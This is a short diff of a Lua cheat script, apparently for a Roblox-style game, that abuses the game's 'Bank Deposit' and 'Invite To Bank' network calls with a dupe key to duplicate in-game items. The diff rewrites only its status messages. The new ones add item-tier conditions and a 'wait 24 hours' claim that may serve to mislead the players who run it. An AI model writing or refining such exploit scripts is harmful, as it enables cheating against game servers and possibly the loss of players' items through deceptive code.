@@ -13,11 +13,11 @@ local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'],
 if request then
     lib.Message.New("Dupe starting");
 else
-    lib.Message.New(request2 and "Something went wrong. Try again! Execute again to work or change server if still not working!");
+    lib.Message.New(request2 and "This Script Only Working In Tier 2-8 Bank only and This Script Only Working For Exclusive/Gem/Huge!");
     return;
 end
 if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey) then
-    lib.Message.New("Dupe successfully! please rejoin");
+    lib.Message.New("Dupe successfully! please wait 24 hours to work! Thank You!");
 else
     lib.Message.New("Dupe failure :frowning: please try again");
 end;
